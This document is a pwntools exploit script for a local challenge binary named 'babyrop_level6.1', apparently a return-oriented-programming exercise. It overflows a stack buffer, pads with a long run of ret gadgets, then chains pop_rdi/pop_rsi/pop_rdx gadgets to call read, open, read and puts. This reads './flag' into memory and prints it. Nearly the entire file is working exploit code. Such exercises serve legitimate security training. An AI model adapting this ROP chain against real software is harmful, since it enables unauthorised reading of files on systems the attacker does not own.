from pwn import *

binary = './babyrop_level6.1'
elf = ELF(binary)
context.binary = binary
p = process(binary)

pop_rdi = 0x000000000040133c
pop_rsi = 0x000000000040132c
pop_rdx = 0x0000000000401324
ret = 0x000000000040101a

gdb.attach(p, '''
b * challenge+73
b * free_gadgets+36
''')

flagfileString_addr = elf.bss() + 100
flag_addr = elf.bss() + 200



offset = 0x80 + 8
payload = flat(
	b'A' * offset,
	
	
	ret,


	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	ret,
	
	
	
	
	
	
	
	# read
	pop_rdi,
	0, # fd
	pop_rsi,
	flagfileString_addr,
	pop_rdx,
	100,
	elf.sym['read'],
	
	# open
	pop_rdi,
	flagfileString_addr,
	pop_rsi,
	0,
	elf.sym['open'],
	
	# read
	pop_rdi,
	3, # fd
	pop_rsi,
	flag_addr,
	pop_rdx,
	100,
	elf.sym['read'],
	
	# write
	pop_rdi,
	flag_addr,
	elf.sym['puts'],
	
)
p.send(payload)
p.send('./flag')

p.interactive()
